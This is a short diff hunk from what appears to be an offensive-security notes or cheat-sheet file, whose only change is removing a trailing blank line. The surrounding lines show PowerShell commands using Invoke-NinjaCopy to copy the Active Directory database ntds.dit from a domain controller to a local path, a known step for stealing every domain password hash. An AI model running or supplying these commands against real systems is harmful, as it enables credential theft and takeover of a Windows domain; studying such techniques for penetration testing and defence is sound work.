@@ -41,4 +41,3 @@ Get-Attack copy
 Get-Help Invoke-NinjaCopy -Examples
 Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit"     ComputerName <DC> -LocalDestination "C:\ntds.dit"
 ls
-
